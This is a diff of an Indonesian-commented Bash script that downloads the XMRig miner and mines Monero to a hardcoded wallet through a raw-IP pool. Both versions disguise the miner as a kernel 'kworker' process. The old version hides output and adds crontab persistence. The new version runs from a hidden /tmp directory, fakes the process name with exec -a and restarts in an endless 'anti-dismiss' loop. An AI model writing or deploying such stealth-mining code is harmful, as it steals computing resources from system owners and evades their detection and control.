@@ -1,64 +1,51 @@
 #!/bin/bash
 
-# === Pengaturan ===
+# === KONFIGURASI ===
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
-FAKE_NAME="kworker-u16_3"
-POOL="134.199.197.80:443"
-XM_DIR="$HOME/xmrig"
+POOL="159.65.167.171:443"
+WORKER_ID="syslog"
+TLS=true
+FAKE_NAME="kworker/u8:2"  # Nama palsu proses agar mirip sistem
+TMP_DIR="/tmp/.sysd"      # Direktori kerja tersembunyi
 
-# === Unduh XMRig terbaru ===
-mkdir -p "$XM_DIR"
-cd "$XM_DIR"
-wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O xmrig.tar.gz
-tar -xf xmrig.tar.gz --strip-components=1
-rm xmrig.tar.gz
+# === SIAPKAN DIREKTORI KERJA ===
+mkdir -p "$TMP_DIR"
+cd "$TMP_DIR" || exit
 
-# === Rename binary agar tersamarkan ===
-cp xmrig "$FAKE_NAME"
-chmod +x "$FAKE_NAME"
+# === UNDUH XMRIG JIKA BELUM ADA ===
+if [ ! -f "./$FAKE_NAME" ]; then
+  echo "[*] Mengunduh XMRig..."
+  wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-static-x64.tar.gz -O xmrig.tar.gz
+  tar -xf xmrig.tar.gz
+  DIR=$(tar -tf xmrig.tar.gz | head -1 | cut -f1 -d"/")
+  mv "$DIR/xmrig" "./$FAKE_NAME"
+  chmod +x "$FAKE_NAME"
+  rm -rf "$DIR" xmrig.tar.gz
+fi
 
-# === Buat config.json anti-ban ===
+# === BUAT CONFIG TERSEMBUNYI ===
 cat > config.json <<EOF
 {
-  "autosave": true,
-  "background": false,
-  "colors": false,
-  "randomx": {
-    "1gb-pages": false,
-    "rdmsr": false,
-    "wrmsr": false,
-    "numa": false
-  },
-  "cpu": {
-    "enabled": true,
-    "priority": 5,
-    "max-threads-hint": 85,
-    "yield": true
-  },
-  "donate-level": 0,
-  "log-file": null,
+  "autosave": false,
+  "cpu": true,
+  "opencl": false,
+  "cuda": false,
   "pools": [
     {
       "url": "$POOL",
       "user": "$WALLET",
-      "pass": "x",
+      "pass": "$WORKER_ID",
       "keepalive": true,
-      "tls": false
+      "tls": $TLS
     }
-  ],
-  "print-time": 60,
-  "retries": 5,
-  "retry-pause": 10,
-  "syslog": false,
-  "user-agent": "$FAKE_NAME",
-  "watch": true
+  ]
 }
 EOF
 
-# === Jalankan miner di background ===
-nohup ./"$FAKE_NAME" --config=config.json > /dev/null 2>&1 &
-
-# === Tambahkan ke crontab untuk auto-start saat reboot ===
-(crontab -l 2>/dev/null; echo "@reboot cd $XM_DIR && nohup ./$FAKE_NAME --config=config.json > /dev/null 2>&1 &") | crontab -
-
-echo "[✔] Setup selesai. Mining sedang berjalan sebagai proses '$FAKE_NAME'"
+# === JALANKAN DALAM LOOP ANTI-DISMISS DENGAN PENYAMARAN ===
+while true; do
+  echo "[*] Menjalankan proses sebagai '$FAKE_NAME'..."
+  exec -a "$FAKE_NAME" "./$FAKE_NAME" --config=config.json
+  echo "[!] Proses keluar. Restart 5 detik..."
+  sleep 5
+done
